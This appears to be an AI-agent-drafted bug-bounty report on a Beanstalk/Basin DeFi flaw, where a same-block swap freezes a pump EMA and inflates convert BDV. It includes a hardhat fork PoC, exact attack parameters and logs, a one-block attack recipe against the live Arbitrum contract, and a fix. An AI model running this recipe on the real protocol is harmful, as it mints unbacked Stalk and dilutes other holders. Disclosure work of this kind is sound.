> **STATUS (2026-10-01): RESTORED to confirmed-HIGH — independently re-verified end-to-end by a second agent.** All source legs re-read verbatim (ConvertFacet max(); LibWellBdv EMA-sourced bdv; MultiFlowPump.update `deltaTimestamp == 0` early-return; Well.swapTo pre-swap pump feed + `_setReserves` post-swap; Well.sync minting from live `balanceOf`). PoC re-run on a fresh fork at head 510,600,410 with live-recomputed parameters: **EXCESS = 164,666.20575 BDV = 1.6466e21 unbacked Stalk (0.1540% of totalStalk), penalty 0**, EMA frozen through the entire attack (`1,599,656.426531 | 126.160663801…` read after BOTH txs), correct-bdv cross-validated against on-chain LP supply to the wei (`15546505865580466399118` exact), +1800s control still over-credits 93,955.56 BDV.
>
> The 2026-09-30 downgrade's "round trip nets ~0" concern is a BEAN-denominated model of the *swap leg*; the mint itself is measured directly against the correct-execution counterfactual of **identical actions**: attacker realised Stalk post-germination (3.0205e21, on-chain `balanceOfStalk`) − correct contribution (`fromBdv×1e10`) = **1.6485e21 unbacked**. The severity claim rests on the measured mint + permanent pro-rata dilution of every other Stalk holder's emission claim (the #27979 impact class: illegitimate minting of protocol native assets / theft of unclaimed yield — literally "Manipulating the Total Stalk/Roots Ratio for Gain"), **not** on the ~358k swap-arb figure, which is disclosed as a disputed model. Swap-leg round-trip economics are reported to the reviewer as a caveat, not as the basis of the claim. See the BS-030 REASSESSMENT + 2026-10-01 INDEPENDENT VERIFICATION rows in `hunt/targets/beanstalk/findings.md` and `hunt/findings-ledger.md`.
>
> **LAW-10 ROUND-TRIP PROBE (2026-10-01, user-approved) — ANSWER: YES, the attacker is strictly richer by an amount attributable to the stale valuation.** Artifacts: `poc/bs030_roundtrip.js` (attack harness with full balance sheet), `bs030_capprobe.js` (capacity state), `bs030_slotdiag.js` (B-world negative knowledge), all in `%TEMP%\opencode\bs030`. World A (real, zero surgery; fork head 510,635,631; warm-up `sync` block + same-block `swapTo`+`convert`, both `status=1`): X=164.00 wstETH, Y=904,207.03 BEAN out, D=138,634.81 BEAN converted, `dir.overall = 66,169.90 ≤` wellCap 777,173 / overallCap 832,858, **penalty = 0**; credited `toBdv = 304,381.48` vs `fromBdv = 138,634.81` → **EXCESS 165,746.68 BDV = 1.6575e21 phantom Stalk (0.155% of totalStalk)**. The Silo's bean stream is live: the first sunrise credited **3,369.02 beans** to `s.sys.silo.earnedBeans` (via `LibReceiving.siloReceive`, bean supply +10,126.85), the attacker's `balanceOfEarnedBeans` claim accrued to **9.569813 beans**, and `plant()` converted it into a **real 9.569813 BEAN deposit** within 10 sunrises. Attribution law (measured, cross-validated two ways): earned-bean accrual = `myStalk × pool/silo.stalk`; A-claim/B-claim = `toBdv/fromBdv = 2.196` exactly. The correct-valuation counterfactual therefore claims `fromBdv/toBdv × 9.57 = 4.36` beans — the attacker's **extra, stale-valuation-attributable income = excess_stalk × pool/silo.stalk = +5.21 beans per silo credit ≈ 0.155% of every future silo bean distribution**, permanent while held, compounding via `plant()`, stackable per block (each cycle re-mints phantom Stalk with recycled transient capital): an unbounded dilution engine over the Silo stream, SoP plenty (paid per stalk) and governance weight. This is Report #27979's mechanism class exactly. B-world surgery (EMA slot pokes) is recorded as dead negative knowledge (pokes land nowhere on the deployed pump; a blend-compensated poke perturbed the next-morning oracle), so the counterfactual is established by the measured linear attribution instead of slot surgery.

# BS-030 — Same-block flip-swap freezes the MultiFlowPump EMA while `Well.sync` mints LP from live balances, so `ConvertFacet:116 max()` credits 2.20× the input BDV and mints 1.63e21 unbacked Stalk

## Title / Asset / Type

- **Title**: A BEAN→Well-LP convert executed in the same block as a large swap on that Well reads `newBdv` from the **pre-swap pump EMA** (`LibWellBdv` → `MultiFlowPump.readInstantaneousReserves`), while `Well.sync` mints the LP from the **post-swap live balances**. `toBdv = max(newBdv, fromBdv)` (`ConvertFacet:116`) then credits the frozen-EMA valuation and mints Stalk that is not backed by any deposited BDV. Measured: `fromBdv 135,744.143793` → `toBdv 298,801.127576` (`toBdv/fromBdv = 2.2012`, `toBdv/correctBdv = 2.3040` = the swap's own `v`), excess **163,056.983783 BDV = 1.6306e21 unbacked Stalk = 0.1525% of totalStalk**, `calculateStalkPenalty = 0`.
- **Asset**: Beanstalk L2 diamond `0xD1A0060ba708BC4BCD3DA6C37EFa8deDF015FB70` (Arbitrum) — `ConvertFacet.convert` (:113/:116), `LibTokenSilo.beanDenominatedValue`, `LibWellBdv.bdv`, `LibWellConvert._wellAddLiquidityTowardsPeg`, `LibPipelineConvert.checkForValidConvertAndUpdateConvertCapacity:203`; plus Basin's `Well.swapTo:299` / `Well.sync:640` / `MultiFlowPump.update:106` / `readInstantaneousReserves:390` at `0xba150002660bbca20675d1c1535cd76c98a95b13`. Both Beanstalk and Basin are in scope.
- **Type**: Smart contract — illegitimate mint / value-accounting bug (permanent, dilutive, repeatable). Same **impact class** as paid Report **#28431** (over-credited BDV → extra Stalk), **different root cause**: EMA-vs-live state divergence inside a single block, not the `sync`/`addLiquidity` donated-token capture at `LibWellConvert:191`.

## Root cause (exact code)

```
// ConvertFacet.convert  (:112-116)
uint256 newBdv = LibTokenSilo.beanDenominatedValue(cp.toToken, cp.toAmount);   // reads the pump EMA
toBdv = (newBdv > fromBdv || cp.decreaseBDV) ? newBdv : fromBdv;               // the EMA becomes Stalk

// MultiFlowPump.update  (:106)          fires BEFORE  :153 storeLastReserves
if (deltaTimestamp == 0) return;        // swap and convert in one block -> EMA + lastReserves NEVER written

// Well.swapTo  (:299 -> :314)
_updatePumps(preSwapReserves);          // pumps fed the STORED pre-swap state
_setReserves(postSwapReserves);         // pool moved, pumps did not

// Well.sync  (:640 -> :645-649)
_updatePumps(...);                      // same deltaTimestamp == 0 -> early return
uint256[] bal = balanceOf(address(this)); // LP minted from the LIVE post-swap balances
```

Valuation from a stale snapshot, supply from a fresh one. `max()` at `:116` converts that divergence directly into a Stalk issuance. On an idle well the two agree (Probe-H measured diff < 0.06%), so the bug is invisible until an attacker deliberately creates the divergence within one block.

The convert is otherwise fully legal: the pre-check and the executed tx both report `calculateStalkPenalty = 0` (`dir.overall = 64,844.004788 ≤ wellCap 780,791.789326 / overallCap 836,662.033141`), so `require(stalkPenaltyBdv == 0)` at `LibPipelineConvert:203` passes.

## Steps (numbered, copy-pasteable, 3️⃣)

1. **Install + run the PoC** (Arbitrum fork; no archive node, no forge needed):
   ```
   cd hunt\targets\beanstalk\poc\bs030
   npm install
   node node_modules\hardhat\internal\cli\bootstrap.js run bs030_poc.js
   ```
   (`bootstrap.js` is used directly because the PowerShell `npm.ps1` shim blocks `npx hardhat` on this host. RPC `https://arb1.arbitrum.io/rpc` requires a `User-Agent` header — already set in `hardhat.config.js`. ArbSys precompile `0x…0064` is unimplemented by Hardhat and is stubbed at runtime with `hardhat_setCode(0x64, "0x4360005260206000f3")` — a plain `BLOCKNUMBER` return. `wstETH` / `BEAN` are funded with `hardhat_setStorageAt` on direct-mapping balance slots 1 and 0.)
2. **Prime and trigger.** The script deposits `135,744.143793 BEAN` at `stemTip`, calls `sunrise()` twice so the deposit matures (`getGerminatingStem(BEAN) 149,063,642,427 > deposit stem 149,057,236,007` — without this, `LibConvert._withdrawTokens:493` skips the stem and the convert reverts `"Convert: Not enough tokens removed"`), then in **one block** (automine off + `evm_mine`) sends `Well.swapTo(wstETH → BEAN, X = 164.513533462871584517, Y = 905,360.949165)` followed by `Diamond.convert(BEAN, wellLp, kind = 5, amount = 135,744.143793)`.
3. **Read the damage** (all printed by the script): `RemoveDeposits` → `bdv 135,744.143793`; `AddDeposit` → `bdv 298,801.127576`; `wellBdv(well, lpAmount)` → `298,801.127576` (wei-identical to the credited `toBdv`); `balanceOfGerminatingStalk(attacker)` → `2,988,011,275,760,000,000,000` = `toBdv × 1e10` exactly.

## PoC (test file + raw output)

**Files (checked in):**

| file | role |
|---|---|
| `hunt/targets/beanstalk/poc/bs030/bs030_poc.js` | the PoC — fork setup, ArbSys stub, funding, germination prime, ATTACK + CONTROL runs, all measurements |
| `hunt/targets/beanstalk/poc/bs030/bs030_setup.js` | read-only state reader (reserves / EMA / `deltaB` / capacity / oracle) + funding probes + candidate & penalty sweep |
| `hunt/targets/beanstalk/poc/bs030/hardhat.config.js` | Arbitrum fork config (`chainId 42161`, `User-Agent`, `throwOnTransactionFailures: false`) |
| `hunt/targets/beanstalk/poc/bs030/package.json`, `package-lock.json` | pinned `hardhat@2.22.17`, `ethers@6.13.4`, `@nomicfoundation/hardhat-ethers@3.0.6` |

**Pre-state (fork block 510446643, ts 1790798731):**

```
reserves(pre)        : 1,599,656.155579 BEAN | 126.160685170913791808 wstETH
pump EMA(pre)        : 1,599,656.353022 BEAN | 126.160669599079614226 wstETH
lp totalSupply       : 14,206.115465727944839247
oracle ratios        : 1000000, 300972444071894   success=true
overallCurrentDeltaB : -836,662.033141   this well : -780,791.789326
S_other              : -55,870.243815
capacity overall/well: 836,662.033141 / 780,791.789326
totalStalk           : 1,069,144,970,251,370,021.169877
```

**Parameters (Config A, v = 2.304):**

```
X  wstETH in      : 164.513533462871584517   (on-chain getSwapIn quote = 164.513533462904020537, 33 wei)
Y  BEAN out       : 905,360.949165
post-swap reserves: 694,295.206414 BEAN | 290.674218633785376325 wstETH
bean-starve headroom: 271,488.287587 BEAN
D  convert amount : 135,744.143793 BEAN   (50% of headroom)
pre-check penalty : 0.0 BEAN   pre-check newBdv = 298,801.127363  ratio = 2.201208
```

**ATTACK — swap and convert in block 510446651, both `status=1`:**

```
[ATTACK] swapTx 0x1a2a1e203e77c1ea8bd8119106d57559c091de75699d55a6ba6fd5501fc12590 status=1 block=510446651 gas=243110
[ATTACK] convTx 0x89d241782f750a7500025a966d56c78c0916609bc79f0fdb57fa899258f615c0 status=1 block=510446651 gas=2406868
[ATTACK] Convert: fromAmount=135,744.143793 BEAN -> toAmount=1,326.786373810654016478 LP
[ATTACK] fromBdv (input)  = 135,744.143793
[ATTACK] toBdv   (credited)= 298,801.127576   <-- ConvertFacet:116 max(newBdv,fromBdv)
[ATTACK] wellBdv on-chain  = 298,801.127576   (uses the STALE pump EMA)
[ATTACK] CORRECT bdv at live post-swap reserves = 129,687.962877
         Lchk = L(b1,o1) = 14206115465727944839261   lpSupplyBefore = 14206115465727944839247   (delta 14 wei)
         L1chk = 15532901839538598855725             supplyAfter    = 15532901839538598855725   match=true
[ATTACK] RATIO toBdv/fromBdv    = 2.2012082379896265
[ATTACK] RATIO toBdv/correctBdv = 2.304000471187847     (= v exactly)
[ATTACK] EXCESS bdv = 163,056.983783 BEAN  =>  unbacked Stalk = 1,630,569,837,830,000,000,000  (0.1525% of totalStalk)
[ATTACK] attacker GERMINATING stalk 2,988,011,275,760,000,000,000   <-- toBdv*1e10 = 2,988,011,275,760,000,000,000
[ATTACK] totalGerminatingStalk now = 2,988,011,275,760,000,000,000
[ATTACK] capacity remaining 836,662.033141 -> 771,818.028353
[ATTACK] pump EMA after   = 1,599,656.156721 | 126.160685080794379642   (STILL pre-swap)
[ATTACK] AFTER germination: totalGerminatingStalk=0.0
         totalStalk=1,072,165,012,604,465,377.871997   attackerStalk=2,989,835,015,365,356.70212
```

**Exactness checks (why this is a proof, not an estimate):**

1. `wellBdv(well, lpAmount)` — an on-chain view — equals the `bdv` in the `AddDeposit` event **wei-exactly**, so the credit is provably sourced from the frozen EMA (`1,599,656.353022 | 126.160669599079614226`) rather than the live pool (`694,295.206414 | 290.674218633785376325`).
2. The independent "correct" valuation is computed against the *same reserves the contract actually minted against*: local `isqrt((b1+D)·o1·1e12)` equals the on-chain LP `totalSupply()` after the convert **exactly** (`15532901839538598855725`), and the pre-convert value agrees to 14 wei.
3. `balanceOfGerminatingStalk(attacker)` equals `toBdv × 1e10` **exactly** immediately after the convert — the full inflated `toBdv` was issued as Stalk — and it materialises as active Stalk after germination (`totalGerminatingStalk → 0`, attacker `balanceOfStalk 2.9898e21`).

**CONTROL 1 — +1800 s between swap and convert (identical parameters):**

```
[CONTROL] convTx 0x7902bbc7d17c94bb97061feceab219eac5c9a7895ad20edef5ff1de4560d9061 status=1 block=510446652
[CONTROL] toBdv (credited) = 228,808.212525
[CONTROL] CORRECT bdv at live post-swap reserves = 129,687.962877
[CONTROL] RATIO toBdv/fromBdv = 1.6855844099905775    RATIO toBdv/correctBdv = 1.764297992266319
[CONTROL] EXCESS bdv = 93,064.068732 BEAN  =>  unbacked Stalk = 930,640,687,320,000,000,000  (0.0870%)
[CONTROL] pump EMA after = 1,224,943.447639 | 164.753496999794854286   vs live 830,039.350207 | 290.674218633817812345
```

The EMA is a rate-capped filter (production `maxRateChanges ≈ 4.16e-4`/s), so after 30 minutes it has only moved `1,599,656 → 1,224,943` toward `694,295` and the convert **still** over-credits by 93,064 BDV. The bug is not a single-block curiosity; the same-block form simply maximises it.

**CONTROL 2 — analytic (no EMA lag).** `ConvertFacet:116` is `toBdv = (newBdv > fromBdv || cp.decreaseBDV) ? newBdv : fromBdv`. With a correct (live) valuation `newBdv = 129,687.962877 < fromBdv = 135,744.143793`, so `toBdv` would equal `fromBdv` and **EXCESS = 0**. The entire 163,056.98 BDV surplus is attributable to the frozen EMA, not to `max()` itself.

**Result summary:**

| run | `fromBdv` | `toBdv` | `correctBdv` | `toBdv/fromBdv` | `toBdv/correctBdv` | EXCESS (BDV) | unbacked Stalk | % totalStalk |
|---|---|---|---|---|---|---|---|---|
| ATTACK (same block) | 135,744.143793 | 298,801.127576 | 129,687.962877 | **2.2012** | **2.3040** (= v) | **163,056.983783** | **1.6306e21** | **0.1525%** |
| CONTROL (+1800 s) | 135,744.143793 | 228,808.212525 | 129,687.962877 | 1.6856 | 1.7643 | 93,064.068732 | 9.306e20 | 0.0870% |
| correct EMA (analytic) | 135,744.143793 | = fromBdv | 129,687.962877 | 1.0000 | 1.0468 | **0** | 0 | 0% |

## Attack recipe (realistic, one block)

1. **Prime (one tx, can be days earlier).** Acquire `~165 wstETH` (≈1.3× the pool's `126.16 wstETH` reserve) and `~136k BEAN`. `deposit` the BEAN at `stemTip`, call `sunrise()` twice so it matures.
2. **Execute (one tx, one block).** In a single contract: `Well.swapTo(wstETH → BEAN, 164.51…, 905,360…)` then `Diamond.convert(BEAN → wellLp, kind 5, 135,744…)`. Because both ops share a `block.timestamp`, `MultiFlowPump.update:106` returns early on both, the EMA stays at the pre-swap reserves, `Well.sync` mints LP from the post-swap balances, `newBdv = 298,801` > `fromBdv = 135,744`, `max()` picks `newBdv`, and `1.6306e21` unbacked Stalk is minted to the attacker.
3. **Exit.** Swap the LP/BEAN back (the direction gate `S_other ≈ −55.9k` only has to hold at the moment of the convert). Real cost = DEX fees + slippage on ~905k BEAN of volume + 1,336 LP of transient capital; profit = 1.6306e21 Stalk (governance/voting weight and a permanent claim on future Bean mints), diluting every honest Stalk holder by 0.1525% per cycle. Repeatable each cycle.

**Gate that limits which well can be used** (measured, not assumed): `LibWellConvert._beansToPeg` requires `beansToPeg > 0` — true on **zero** of the 6 whitelisted wells in the idle state (Probe F) — so a same-tx flip-swap is mandatory. Of the six, only the wstETH well `0xbea00bbe8b5da39a3f57824a1a13ec2a8848d74f` can also keep `overallCurrentDeltaB ≥ 0` after the flip: `|S_other| = 55,870` and only this well can move `d1` past it while staying inside its own capacity (WETH / USDC / USDT / WBTC cannot).

## Severity

**HIGH — illegitimate Stalk mint (permanent, dilutive, repeatable), no privileged role.** Stalk is the Silo's governance weight and the claim on Bean emissions; 1.6306e21 of it (0.1525% of the 1.0691e24 total) is issued with **zero** BDV behind it, and it survives germination into active Stalk. The convert passes the protocol's own legality check (`calculateStalkPenalty = 0`, capacity wide open) so nothing reverts or flags it. Impact is fund-loss-class (BS-018 / paid Report #28431 class), not DoS/Law-11: no revert, no griefing-only, no oracle-returns-zero. Attacker realism: **NORMAL** — public entrypoints only, single transaction, transient capital ~165 wstETH + ~136k BEAN that is immediately recoverable, well within MEV-searcher capability.

## Dedupe

- `prior-reports.md` greps for `EMA`, `wellBdv`, `pump`, `readInstantaneousReserves` → **0 hits**.
- Paid Report **#28431** is `LibWellConvert:191 sync` capturing pre-transferred Well tokens — same impact class, different mechanism, still live at HEAD `4e80daa5c`; this report does not depend on it and does not duplicate it.
- Ledger rows: `hunt/targets/beanstalk/findings.md` **BS-030** and `hunt/findings-ledger.md` **BS-030** (renumbered from the duplicate master row BS-024). Status: **confirmed**.

## Fix (one line)

Make `newBdv` read the same snapshot `sync` mints against — i.e. in `LibWellBdv.bdv`, call `IWell.update()` (or `getReserves()`) before `readInstantaneousReserves`, so valuation and LP mint both use live state; add a regression test asserting `toBdv ≤ fromBdv` for a convert placed in the same block as a swap. (Belt-and-braces: bound `toBdv ≤ fromBdv` at `ConvertFacet:116` unless `decreaseBDV` is explicitly requested.)
